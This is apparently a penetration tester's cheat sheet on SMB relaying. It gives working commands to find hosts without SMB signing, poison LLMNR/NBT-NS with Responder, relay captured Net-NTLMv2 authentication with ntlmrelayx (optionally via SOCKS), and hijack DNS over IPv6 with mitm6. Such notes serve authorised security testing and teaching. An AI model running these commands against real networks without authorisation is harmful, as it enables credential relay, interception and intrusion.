# SMB Relaying

### Description

After observing LLMNR and/or NBT-NS traffic with Responder and forcing the client to authenticate to your machine, it is possible for the attacker to relay the Net-NTLMv2 hash obtained to all systems within scope that have SMB Signing Disabled.&#x20;

### Identifying Systems with SMB Signing Disabled

#### RunFinger.py

Finger is included with Responder.py in the `/tools` directory. Simply run the tool against either a subnet or file and parse the results using `cut`

```bash
python3 RunFinger.py -i $subnet
```

#### CrackMapExec

A list can also easily be created with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec):

```bash
crackmapexec smb $subnet --gen-relay-list 
```

#### Nmap

Nmap can also create a list of hosts that have SMB Signing Disabled:

```bash
nmap --script=smb-security-mode -p445 $ip
```

### SMB Relaying 101

After confirming LLMNR/NBT-NS traffic and identifying systems with SMB Signing Disabled, we are ready to perform the attack. First, we need modify the `Responder.conf` file and disable both SMB and HTTP:

```python
# responder.conf

SQL = On
SMB = Off    
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
```

We can then run Responder:

```bash
responder -I eth0 -dwP
```

We can then run `ntlmrelayx.py` from Impacket, supplying our file of hosts previously identified to have SMB Signing Disabled.

```bash
python3 ntlmrelayx.py -tf smbdisabled.out --smb2-support
```

#### Relaying with SOCKS

We can also enable SOCKS support while relaying for interactive sessions.&#x20;

```bash
python3 ntlmrelayx.py -tf smbdisabled.out --smb2-support --socks
```

### Attacking IPv6

While a majority of companies do not utilize IPv6, little know that it is actually enabled by default. By using a tool such as mitm6, we can act as a malicious DNS server and redirect traffic to our attack host.&#x20;

The following command demonstrates basic usage of IPv6:

```bash
sudo mitm6 -d $domain
```

Additionally, the following command demonstrates running mitm6 with the `--ignore-nofqnd` flag which will ignore DHCPv6 queries that do not contain the Fully Qualfiied Domain Name:

```bash
sudo mitm6 -d $domain --ignore-nofqnd
```

### References

{% embed url="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html" %}

{% embed url="https://en.hackndo.com/ntlm-relay" %}

{% embed url="https://docs.microsoft.com/en-us/archive/blogs/josebda/the-basics-of-smb-signing-covering-both-smb1-and-smb2" %}

{% embed url="https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/exploitation/exploit-without-account/smb-relay" %}

{% embed url="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6" %}
